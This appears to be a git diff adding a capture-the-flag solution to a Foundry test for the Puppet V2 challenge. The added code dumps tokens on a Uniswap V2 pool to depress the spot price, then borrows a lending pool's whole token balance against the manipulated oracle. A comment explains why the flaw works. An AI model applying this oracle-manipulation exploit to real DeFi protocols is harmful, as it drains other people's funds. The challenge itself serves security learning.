@@ -99,6 +99,41 @@ contract PuppetV2Challenge is Test {
      */
     function test_puppetV2() public checkSolvedByPlayer {
         
+        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
+        
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+        
+        //sell all tokens to dump the price
+        uint256 tokensToSell = token.balanceOf(player);
+        uniswapV2Router.swapExactTokensForETH(
+            tokensToSell,         
+            0,                    
+            path,                 
+            player,               
+            block.timestamp + 1   
+        );
+        
+        
+        // Check required WETH then borrow cheaply
+        uint256 poolTokens = token.balanceOf(address(lendingPool));
+        uint256 requiredWETH = lendingPool.calculateDepositOfWETHRequired(poolTokens);
+        
+        // Convert ETH to WETH (collateral when calling borrow())
+        uint256 ethBalance = address(player).balance;
+        require(ethBalance >= requiredWETH, "Not enough ETH after swap");
+        
+        weth.deposit{value: ethBalance}();
+        
+        weth.approve(address(lendingPool), requiredWETH);
+        
+        lendingPool.borrow(poolTokens);
+        
+        uint256 borrowedTokens = token.balanceOf(player);
+        token.transfer(recovery, borrowedTokens);
+
+        //this is why the exploit works: the pool 'calculateDepositOfWETHRequired()' can be manipulated by selling a lot of tokens in the pool
     }
 
     /**
